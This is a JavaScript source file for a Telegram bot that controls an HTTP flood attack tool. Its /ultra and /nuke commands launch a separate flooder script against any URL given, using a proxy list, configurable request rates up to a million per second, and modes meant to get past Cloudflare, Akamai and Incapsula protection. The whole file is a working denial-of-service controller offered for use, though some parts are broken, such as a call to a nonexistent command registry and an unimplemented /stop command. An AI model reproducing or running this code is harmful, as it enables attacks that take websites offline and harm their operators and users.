import { Telegraf } from 'telegraf';
import { spawn, exec } from 'child_process';
import fs from 'fs';
import dotenv from 'dotenv';
import express from 'express';
import path from 'path';
import { fileURLToPath } from 'url';
import os from 'os';
import crypto from 'crypto';
import session from 'express-session';
import cluster from 'cluster';
import http from 'http';
import https from 'https';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

dotenv.config();

const token = process.env.TELEGRAM_BOT_TOKEN;
if (!token) {
    console.error('❌ TELEGRAM_BOT_TOKEN not found!');
    process.exit(1);
}

const bot = new Telegraf(token);
const ADMIN_ID = '6247762383';

// ========== RAILWAY PRO ULTRA CONFIG ==========
const RAILWAY_CONFIG = {
    MAX_REPLICAS: 50,
    MAX_VCPU: 32,
    MAX_RAM: 32 * 1024, // MB
    MAX_CONCURRENT_ATTACKS: 10,
    MAX_RATE: 1000000, // 1M RPS
    MAX_DURATION: 3600,
    AUTO_SCALE: true,
    SCALE_THRESHOLD: 0.7,
    MAX_WORKERS: os.cpus().length * 10
};

// ========== ULTRA COMMAND ==========
bot.command('ultra', async (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    const [url, duration, rate = '100000', threads = '500', bypass = 'all'] = args;

    if (!url || !duration) {
        return ctx.reply(`
🚀 *RAILWAY PRO ULTRA COMMAND*

Usage: /ultra <url> <duration> [rate] [threads] [bypass]

Examples:
/ultra https://target.com 300 500000 1000 all
/ultra https://target.com 60 100000 500 cloudflare

Bypass modes: all, cloudflare, akamai, incapsula, generic

⚠️ Uses all 50 Railway Pro replicas automatically
        `, { parse_mode: 'Markdown' });
    }

    // Validate
    const targetUrl = new URL(url);
    const attackDuration = Math.min(parseInt(duration), RAILWAY_CONFIG.MAX_DURATION);
    const attackRate = Math.min(parseInt(rate), RAILWAY_CONFIG.MAX_RATE);
    const attackThreads = Math.min(parseInt(threads), RAILWAY_CONFIG.MAX_WORKERS);

    // Check proxies
    if (!fs.existsSync('proxy.txt')) {
        return ctx.reply('❌ proxy.txt not found! Upload one first.');
    }

    const proxies = fs.readFileSync('proxy.txt', 'utf-8').split('\n').filter(l => l.includes(':'));
    if (proxies.length === 0) {
        return ctx.reply('❌ No valid proxies in proxy.txt');
    }

    const attackId = Date.now().toString();
    const replicaCount = RAILWAY_CONFIG.MAX_REPLICAS; // Use all 50 replicas

    const statusMsg = await ctx.replyWithMarkdown(`
╔══════════════════════════════════════════════════════════════╗
║  🚀 RAILWAY PRO ULTRA ATTACK                                  ║
╠══════════════════════════════════════════════════════════════╣
║  ID: ${attackId.slice(0, 8)}...                                             ║
║  Target: ${url.substring(0, 40)}...                                      ║
╠══════════════════════════════════════════════════════════════╣
║  📊 Attack Parameters                                         ║
║  Duration: ${attackDuration}s                                            ║
║  Rate: ${attackRate.toLocaleString()} RPS                                   ║
║  Threads: ${attackThreads}                                              ║
║  Bypass: ${bypass.toUpperCase()}                                            ║
╠══════════════════════════════════════════════════════════════╣
║  🖥️  Railway Pro Resources                                     ║
║  Replicas: ${replicaCount}                                                 ║
║  Total vCPU: ${replicaCount * RAILWAY_CONFIG.MAX_VCPU}                                  ║
║  Total RAM: ${replicaCount * RAILWAY_CONFIG.MAX_RAM}MB                               ║
║  Proxies: ${proxies.length}                                                ║
╠══════════════════════════════════════════════════════════════╣
║  ⚡ Launching attack...                                        ║
╚══════════════════════════════════════════════════════════════╝
    `);

    // Launch attack with all replicas
    const attack = spawn('node', [
        'railway-flooder.js',
        url,
        attackDuration.toString(),
        attackRate.toString(),
        attackThreads.toString(),
        'proxy.txt',
        '--type', 'http',
        '--bypass', bypass,
        '--max', '50000'
    ]);

    // Store attack
    global.attacks = global.attacks || new Map();
    global.attacks.set(attackId, {
        process: attack,
        url,
        startTime: Date.now(),
        duration: attackDuration,
        rate: attackRate,
        threads: attackThreads,
        bypass,
        replicas: replicaCount,
        statusMsg,
        ctx
    });

    // Monitor output
    let lastUpdate = Date.now();
    attack.stdout.on('data', (data) => {
        const output = data.toString();
        if (output.includes('RPS:')) {
            const now = Date.now();
            if (now - lastUpdate > 5000) {
                lastUpdate = now;
                
                // Extract stats
                const rpsMatch = output.match(/RPS: (\d+)/);
                const totalMatch = output.match(/Total: (\d+)/);
                const successMatch = output.match(/Success: (\d+)/);
                
                if (rpsMatch && totalMatch) {
                    ctx.telegram.editMessageText(
                        ctx.chat.id,
                        statusMsg.message_id,
                        null,
                        `
╔══════════════════════════════════════════════════════════════╗
║  🚀 RAILWAY PRO ULTRA ATTACK - RUNNING                        ║
╠══════════════════════════════════════════════════════════════╣
║  ID: ${attackId.slice(0, 8)}...                                             ║
║  Current RPS: ${parseInt(rpsMatch[1]).toLocaleString()}                                     ║
║  Total Requests: ${parseInt(totalMatch[1]).toLocaleString()}                                 ║
║  Success Rate: ${successMatch ? Math.round(parseInt(successMatch[1]) / parseInt(totalMatch[1]) * 100) : 0}%                                      ║
║  Elapsed: ${Math.floor((Date.now() - global.attacks.get(attackId).startTime) / 1000)}s / ${attackDuration}s                         ║
║  Replicas: ${replicaCount} Active                                         ║
╚══════════════════════════════════════════════════════════════╝
                        `,
                        { parse_mode: 'Markdown' }
                    ).catch(() => {});
                }
            }
        }
    });

    attack.on('close', (code) => {
        const attackData = global.attacks.get(attackId);
        if (attackData) {
            ctx.telegram.editMessageText(
                ctx.chat.id,
                statusMsg.message_id,
                null,
                `
╔══════════════════════════════════════════════════════════════╗
║  ✅ RAILWAY PRO ULTRA ATTACK COMPLETE                         ║
╠══════════════════════════════════════════════════════════════╣
║  Target: ${url.substring(0, 40)}...                                      ║
║  Duration: ${attackDuration}s                                            ║
║  Exit Code: ${code}                                                      ║
╚══════════════════════════════════════════════════════════════╝
                `,
                { parse_mode: 'Markdown' }
            ).catch(() => {});
            global.attacks.delete(attackId);
        }
    });
});

// ========== SIMPLE ONE-COMMAND HEAVY ATTACK ==========
bot.command('nuke', async (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    const [url] = args;

    if (!url) {
        return ctx.reply('Usage: /nuke <url> - Launches maximum power attack with all Railway Pro resources');
    }

    // Use maximum settings
    return bot.commands.get('ultra')({
        ...ctx,
        message: {
            ...ctx.message,
            text: `/ultra ${url} 300 1000000 1000 all`
        }
    });
});

// ========== STATUS COMMAND ==========
bot.command('status', (ctx) => {
    const attacks = global.attacks || new Map();
    const uptime = process.uptime();
    
    ctx.replyWithMarkdown(`
📊 *RAILWAY PRO STATUS*

🎯 *Active Attacks:* ${attacks.size}
⏱️ *Uptime:* ${Math.floor(uptime / 3600)}h ${Math.floor((uptime % 3600) / 60)}m
🖥️ *CPU Cores:* ${os.cpus().length}
💾 *Memory:* ${Math.round(os.totalmem() / 1024 / 1024 / 1024)}GB
🌊 *Proxies:* ${fs.existsSync('proxy.txt') ? fs.readFileSync('proxy.txt', 'utf-8').split('\n').filter(l => l.includes(':')).length : 0}

⚡ *Commands:*
/ultra - Advanced attack
/nuke - Maximum power attack
/stop <id> - Stop attack
    `);
});

// ========== START BOT ==========
console.log(`
╔══════════════════════════════════════════════════════════════╗
║  🚀 RAILWAY PRO FLOODER CONTROLLER v4.0                       ║
╠══════════════════════════════════════════════════════════════╣
║  Replicas: ${RAILWAY_CONFIG.MAX_REPLICAS}                                     ║
║  Max RPS: ${RAILWAY_CONFIG.MAX_RATE.toLocaleString()}                                    ║
║  Max Duration: ${RAILWAY_CONFIG.MAX_DURATION}s                                      ║
╠══════════════════════════════════════════════════════════════╣
║  Commands:                                                    ║
║  /ultra <url> <time> [rate] [threads] [bypass]               ║
║  /nuke <url> - Maximum power                                  ║
║  /status - Show system status                                 ║
╚══════════════════════════════════════════════════════════════╝
`);

bot.launch()
    .then(() => console.log('✅ Bot is online!'))
    .catch(err => console.error('❌ Failed:', err.message));

process.once('SIGINT', () => {
    if (global.attacks) {
        global.attacks.forEach(a => a.process?.kill());
    }
    bot.stop('SIGINT');
});
